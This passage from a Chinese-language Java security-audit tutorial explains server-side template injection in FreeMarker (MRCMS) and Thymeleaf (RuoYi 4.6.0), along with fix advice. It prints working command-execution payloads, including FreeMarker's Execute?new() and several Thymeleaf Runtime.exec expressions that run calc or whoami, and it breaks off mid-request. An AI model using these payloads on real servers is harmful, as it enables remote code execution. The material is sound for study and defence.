+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/4.png"
+	width="1887"
+	height="1113"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/4_hu_d5fdaa6e4f50877.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/4_hu_9294e5636b5997d1.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="169"
+		data-flex-basis="406px"
+	
+></p>
+<h3 id="15mrcms-freemarker模板注入漏洞">1.5.MRCMS-freemarker模板注入漏洞
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">运行项目命令</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mvn</span><span class="w"> </span><span class="n">jetty</span><span class="p">:</span><span class="n">run</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>从pom.xml文件可知网站使用了freemarker框架</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/5.png"
+	width="1825"
+	height="736"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/5_hu_45d286ddc70251dd.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/5_hu_d810afb64372bf9f.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="247"
+		data-flex-basis="595px"
+	
+></p>
+<p><strong>网站后台恰好存在文章管理和文件管理和页面管理功能点</strong></p>
+<p><strong>页面管理&mdash;文件管理&mdash;themes&mdash;flatweb&mdash;修改index.html或者about.html</strong></p>
+<p><strong>插入恶意payload</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">#</span><span class="n">assign</span><span class="w"> </span><span class="n">value</span><span class="o">=</span><span class="s">&#34;freemarker.template.utility.Execute&#34;</span><span class="o">?</span><span class="k">new</span><span class="p">()</span><span class="o">&gt;</span><span class="n">$</span><span class="p">{</span><span class="n">value</span><span class="p">(</span><span class="s">&#34;calc.exe&#34;</span><span class="p">)}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/6.png"
+	width="1701"
+	height="988"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/6_hu_cf11eaf66e665d31.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/6_hu_d3a5cf3e62e668ae.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="172"
+		data-flex-basis="413px"
+	
+></p>
+<hr>
+<h2 id="2thymeleaf模板注入">2.Thymeleaf模板注入
+</h2><p><a class="link" href="https://mp.weixin.qq.com/s/IwwThh7c9-MuGjTqt-ZNpQ"  target="_blank" rel="noopener"
+    >Java 安全 | Thymeleaf 模板注入原理分析</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/pBt3Q0VF44AD7tTXxCD7Kg"  target="_blank" rel="noopener"
+    >第60篇：Thymeleaf模板注入漏洞总结及修复方法（上篇）</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/nf4Xu8dgRC35Egrga4shXg"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/nf4Xu8dgRC35Egrga4shXg</a></p>
+<h3 id="21thymeleaf介绍">2.1.Thymeleaf介绍
+</h3><p><strong><font style="color:#DF2A3F;">Thymeleaf模板注入存在版本限制：Thymeleaf在3.0.0到3.0.13存在模板注入漏洞</font></strong></p>
+<p><strong>Thymeleaf是适用于Web和独立环境的现代服务器端Java模板引擎，允许处理HTML、XML、TEXT、JAVASCRIPT、CSS、RAW。</strong></p>
+<p><strong>模板引擎：<br>
+模板引擎对象是org.thymeleaf.ITemplateEngine接口的实现<br>
+Thymeleaf核心是org.thymeleaf.TemplateEngine</strong></p>
+<p>*<em>Thymeleaf 模板的表达式有以下几种：{&hellip;}、消息表达式：#{&hellip;}、链接 URL 表达式：@{&hellip;}、片段表达式：~{&hellip;}。所以很多thymeleaf 模板的注入语句 ${&hellip;} 换成 <em>{&hellip;} 也是可以利用成功的。</em></em></p>
+<h3 id="22thymeleaf使用"><strong>2.2.Thymeleaf使用</strong>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">dependency</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&lt;</span><span class="n">groupId</span><span class="o">&gt;</span><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">boot</span><span class="o">&lt;/</span><span class="n">groupId</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">spring</span><span class="o">-</span><span class="n">boot</span><span class="o">-</span><span class="n">starter</span><span class="o">-</span><span class="n">thymeleaf</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="23thymeleaf漏洞利用方式">2.3.Thymeleaf漏洞利用方式
+</h3><p><strong>测试中遇到很多问题就是SpringBoot版本和Thymeleaf版本不匹配的问题，只有Spring3以下版本才会使用Thymeleaf的漏洞版本，Spring3以上版本使用的Thymeleaf版本过高，不会存在模板注入问题</strong></p>
+<h4 id="第一种情况return内容可控"><font style="color:#DF2A3F;">第一种情况，return内容可控</font>
+</h4><p><strong>这种情况最容易出现thymeleaf模板注入漏洞，一旦用户提交的数据可以传到return语句中，攻击者就可以提交恶意模板注入语句使thymeleaf组件进行模板解析，造成代码执行漏洞。</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/7.png"
+	width="2426"
+	height="1038"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/7_hu_a81c6e0336caa8cb.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/7_hu_d061698b8551cd1.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="233"
+		data-flex-basis="560px"
+	
+></p>
+<h4 id="第二种情况url路径可控"><font style="color:#DF2A3F;">第二种情况，URL路径可控</font>
+</h4><p><strong>这种情况比较少见，要求方法的返回类必须为void，此时会从URL中获取viewname，以URL路由为视图名称，调用模板视图去解析。</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/8.png"
+	width="2362"
+	height="987"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/8_hu_bcdca2fd2d7b6697.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/8_hu_1073ee0b3972af4b.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="239"
+		data-flex-basis="574px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">__$</span><span class="o">%</span><span class="n">7bnew</span><span class="o">%</span><span class="n">20java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">Scanner</span><span class="p">(</span><span class="n">T</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">).</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="o">%</span><span class="n">22calc</span><span class="o">%</span><span class="n">22</span><span class="p">).</span><span class="na">getInputStream</span><span class="p">()).</span><span class="na">next</span><span class="p">()</span><span class="o">%</span><span class="n">7d__</span><span class="p">::.</span><span class="na">x</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="第三种情况模板内容可控"><font style="color:#DF2A3F;">第三种情况，模板内容可控</font>
+</h4><p><strong>模板内容可控这种情况太少见了</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/9.png"
+	width="1002"
+	height="439"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/9_hu_e0a50f6f8726ae12.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/9_hu_4a718dbae76a7cd0.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="228"
+		data-flex-basis="547px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">__$</span><span class="o">%</span><span class="n">7bnew</span><span class="o">%</span><span class="n">20java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">Scanner</span><span class="p">(</span><span class="n">T</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">).</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="o">%</span><span class="n">22whoami</span><span class="o">%</span><span class="n">22</span><span class="p">).</span><span class="na">getInputStream</span><span class="p">()).</span><span class="na">next</span><span class="p">()</span><span class="o">%</span><span class="n">7d__</span><span class="p">::.</span><span class="na">x</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">__$</span><span class="p">{</span><span class="n">T</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">).</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">)}</span><span class="n">__</span><span class="p">::</span><span class="n">RoboTerh</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">__$</span><span class="p">{</span><span class="n">T</span><span class="o">%</span><span class="n">20</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">).</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">)}</span><span class="n">__</span><span class="p">::.</span><span class="na">x</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">;</span><span class="o">/</span><span class="n">__$</span><span class="p">{</span><span class="n">T</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">runtime</span><span class="p">).</span><span class="na">getruntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">)}</span><span class="n">__</span><span class="p">::.</span><span class="na">x</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//__${T(java.lang.runtime).getruntime().exec(&#34;calc&#34;)}__::.x</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="24漏洞修复建议">2.4.漏洞修复建议
+</h3><h4 id="1使用responsebody或restcontroller修饰">1.使用@ResponseBody或@RestController修饰
+</h4><p><strong><font style="color:rgb(68, 68, 68);">@ResponseBody 是一个Spring框架中的注解，它用于指示该方法的返回值应该直接写入HTTP响应正文ResponseBody中，</font><font style="color:rgb(223, 34, 34);">而不是通过视图解析器进行渲染</font></strong><font style="color:rgb(68, 68, 68);">。使用 @ResponseBody 注解可以将方法返回值以JSON、XML等格式直接写入HTTP响应体中，常用于返回 RESTful API 接口的响应数据。</font></p>
+<p><strong><font style="color:rgb(68, 68, 68);">@RestController是Spring框架中的一个注解，它结合了@Controller和 @ResponseBody注解的功能，用于简化 RESTful Web 服务开发。</font></strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/10.png"
+	width="949"
+	height="226"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/10_hu_6de2d28e9bf5f03c.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/10_hu_43e5a83cf65761ca.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="419"
+		data-flex-basis="1007px"
+	
+></p>
+<h4 id="2使用redirect或forward修饰">2.使用redirect:或forward:修饰
+</h4><p><strong><font style="color:rgb(68, 68, 68);">根据springboot定义，如果名称以redirect:开头，则不再调用ThymeleafView解析，调用RedirectView去解析controller的返回值。这里需要注意的是，</font></strong><font style="color:rgb(223, 34, 34);">除了redirect:之外，还有forward:，这点网上很少提到</font><font style="color:rgb(68, 68, 68);">。</font></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/11.png"
+	width="873"
+	height="160"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/11_hu_c1c5aada6d1880d1.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/11_hu_6e50be570b0147e8.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="545"
+		data-flex-basis="1309px"
+	
+></p>
+<h4 id="3设置为httpservletresponse">3.设置为HttpServletResponse
+</h4><p><strong>由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析，也就不会存在模板注入漏洞了。</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/12.png"
+	width="929"
+	height="173"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/12_hu_b325a903dcd59db6.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/12_hu_9f9f7656c3c6ffc1.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="536"
+		data-flex-basis="1288px"
+	
+></p>
+<p><strong><font style="color:#DF2A3F;">Thymeleaf 默认会阻止 </font></strong><code>${...} 或 </code><font style="color:#DF2A3F;"><strong>${&hellip;}</strong></font>**<font style="color:#DF2A3F;"> 这类模板表达式出现在 </font>**视图名称（View Name）<font style="color:#DF2A3F;">或 </font>请求参数中，这是出于安全考虑<font style="color:#DF2A3F;">，防止 </font>服务器端模板注入（SSTI）攻击<font style="color:#DF2A3F;">。</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">spring</span><span class="p">.</span><span class="na">thymeleaf</span><span class="p">.</span><span class="na">enable</span><span class="o">-</span><span class="n">preprocessing</span><span class="o">=</span><span class="kc">false</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="25ruoyi460thymeleaf模板注入">2.5.RuoYi4.6.0&mdash;Thymeleaf模板注入
+</h3><p><a class="link" href="https://mp.weixin.qq.com/s/jiZekTPzMv8fnAbNvDl6fg"  target="_blank" rel="noopener"
+    >JAVA代审-RuoYi4.6.0</a></p>
+<p>项目地址：<a class="link" href="https://gitee.com/y_project/RuoYi/repository/archive/v4.6.0.zip"  target="_blank" rel="noopener"
+    >https://gitee.com/y_project/RuoYi/repository/archive/v4.6.0.zip</a></p>
+<p><strong>导入sql下两个数据库文件，使用：</strong><code>admin:admin123</code><strong>进行登录即可</strong></p>
+<p><strong>更改ruoyi-admin目录下的配置文件</strong></p>
+<p>先看pom.xml文件，看使用了什么模板技术</p>
+<p><strong>使用的Thymeleaf版本为3.0.11</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/13.png"
+	width="2238"
+	height="503"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/13_hu_d29ecca44fcaf85f.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/13_hu_e0d63411c505b261.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="444"
+		data-flex-basis="1067px"
+	
+></p>
+<p><strong>版本是3.0.11，是存在漏洞的版本，全局搜索::，也就是片段表达式</strong></p>
+<p><strong>全局搜索</strong><code>::</code></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/14.png"
+	width="974"
+	height="696"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/14_hu_9698ad7ebea2378f.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/14_hu_a21f2b8aab3dd441.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="139"
+		data-flex-basis="335px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">__$</span><span class="o">%</span><span class="n">7bnew</span><span class="o">%</span><span class="n">20java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">Scanner</span><span class="p">(</span><span class="n">T</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">).</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="o">%</span><span class="n">22calc</span><span class="o">%</span><span class="n">22</span><span class="p">).</span><span class="na">getInputStream</span><span class="p">()).</span><span class="na">next</span><span class="p">()</span><span class="o">%</span><span class="n">7d__</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>根据路由构造请求</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/15.png"
+	width="1234"
+	height="1061"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/15_hu_5b7a39d10be68aa1.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/15_hu_4af1ca556cc35ec9.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="116"
+		data-flex-basis="279px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">monitor</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">getNames</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">102</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">;</span><span class="w"> </span><span class="n">rv</span><span class="p">:</span><span class="n">139</span><span class="p">.</span><span class="na">0</span><span class="p">)</span><span class="w"> </span><span class="n">Gecko</span><span class="o">/</span><span class="n">20100101</span><span class="w"> </span><span class="n">Firefox</span><span class="o">/</span><span class="n">139</span><span class="p">.</span><span class="na">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">TW</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">7</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">HK</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">5</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">3</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Referer</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//192.168.0.102/index</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Priority</span><span class="p">:</span><span class="w"> </span><span class="n">u</span><span class="o">=</span><span class="n">4</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">119</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
